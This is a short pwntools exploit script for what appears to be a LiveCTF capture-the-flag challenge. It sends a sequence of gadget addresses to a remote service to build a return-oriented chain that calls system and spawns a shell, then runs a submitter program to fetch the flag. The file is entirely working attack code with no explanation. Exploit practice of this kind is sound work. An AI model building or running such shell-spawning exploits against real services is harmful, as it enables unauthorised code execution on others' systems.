#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

s = remote(HOST, int(PORT))
sla = s.sendlineafter
sa = s.sendafter

system = b'401917'
pprdi = b'402218'

for i in range(4):
    sla(b'pls:',str(400000000).encode())

sla(b'pls:',pprdi)
sla(b'pls:',b'409386')
sla(b'pls:',pprdi)
sla(b'pls:',b'426893')

sla(b'pls:',pprdi)
sla(b'pls:',b'97176')
sla(b'pls:',pprdi)
sla(b'pls:',b'426893')

sla(b'pls:',b'401914')
sla(b':',b'0')

s.sendline(b'./submitter')
flag = s.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)
